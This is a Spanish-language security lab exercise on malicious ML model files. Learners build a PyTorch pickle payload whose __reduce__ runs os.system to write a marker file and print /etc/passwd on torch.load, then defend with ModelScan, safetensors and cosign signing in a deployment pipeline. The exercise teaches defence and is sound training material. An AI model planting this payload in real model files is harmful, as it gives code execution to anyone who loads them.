# Ejercicio M5 — Pickle RCE + defensa con ModelScan + cosign

## Setup
Entorno con Python 3 + PyTorch + cosign. En el container `tools`:

```bash
docker compose exec tools bash
pip install torch modelscan --break-system-packages
curl -sLO https://github.com/sigstore/cosign/releases/download/v2.2.4/cosign-linux-amd64
chmod +x cosign-linux-amd64 && sudo mv cosign-linux-amd64 /usr/local/bin/cosign
```

---

## Parte 1 — Construir un modelo malicioso (10 min)

Crea `evil_model.py`:

```python
import torch, pickle, os

class Evil:
    def __reduce__(self):
        return (os.system, ("echo 'PWNED' > /tmp/pwned && cat /etc/passwd",))

# Simula un modelo con un campo malicioso
torch.save({"weights": torch.randn(100), "metadata": Evil()}, "evil_model.pt")
print("Modelo malicioso creado")
```

Ejecútalo. Después, simula a la víctima:

```python
import torch
m = torch.load("evil_model.pt")   # ← BOOM
```

Verifica: `cat /tmp/pwned` y mira si tienes el contenido de `/etc/passwd`.

### Pregunta
¿Funciona con `torch.load("evil_model.pt", weights_only=True)`? ¿Por qué? ¿Sirve siempre?

---

## Parte 2 — Detectar con ModelScan (5 min)

```bash
modelscan -p evil_model.pt
```

Observa el output. Identifica:
- Nivel de severidad reportado.
- Qué operación detectó.

Bonus: pruébalo contra `bert-base-uncased` descargado de HuggingFace (debería ser limpio).

---

## Parte 3 — Convertir a safetensors (10 min)

```bash
pip install safetensors transformers
```

```python
from safetensors.torch import save_file
import torch

weights = {"w": torch.randn(100)}
save_file(weights, "model.safetensors")
# Carga segura
from safetensors.torch import load_file
loaded = load_file("model.safetensors")
```

Intenta construir un "evil_model.safetensors" análogo al anterior. **No podrás**. ¿Por qué?

---

## Parte 4 — Firmar con cosign (15 min)

```bash
# Setup local cosign (sin OIDC para el ejercicio)
cosign generate-key-pair    # genera cosign.key + cosign.pub

# Firma
cosign sign-blob --key cosign.key --output-signature model.sig model.safetensors

# Verifica (correcto)
cosign verify-blob --key cosign.pub --signature model.sig model.safetensors

# Modifica el modelo (simula tampering)
echo "tampered" >> model.safetensors

# Verifica (debe fallar)
cosign verify-blob --key cosign.pub --signature model.sig model.safetensors
```

### Entregable
Pipeline (bash o Makefile) que:
1. Falla si `modelscan` detecta riesgo.
2. Falla si la firma cosign no verifica.
3. Solo entonces despliega el modelo.

---

# 🔓 Solución de referencia

<details>
<summary>Mira tras hacerlo</summary>

### Parte 1
- `weights_only=True` desde PyTorch 2.4 bloquea pickle arbitrario. Funcionará en versiones < 2.4 o si el modelo usa subclases custom de `nn.Module` que requieran pickle full.

### Parte 2
- ModelScan reporta CRITICAL: detecta uso de `posix.system` en el pickle.

### Parte 3
- safetensors es **sólo datos** (sin código). No tiene `__reduce__` ni equivalente. La intención de safetensors es exactamente eso: ningún vector de RCE.

### Parte 4 — Pipeline ejemplo
```bash
#!/bin/bash
set -e
modelscan -p $1 || { echo "Scan failed"; exit 1; }
cosign verify-blob --key cosign.pub --signature $1.sig $1 || { echo "Sig failed"; exit 1; }
cp $1 /opt/models/
```

</details>

---

## Reflexión

Tras los 4 retos, responde:
1. ¿Por qué la industria sigue usando pickle pese al riesgo conocido desde hace una década?
2. ¿Qué fricción introduce safetensors + cosign + ModelScan en tu pipeline? ¿Es asumible?
3. ¿Cómo lo argumentarías al equipo de ML que no quiere "frenar el research"?
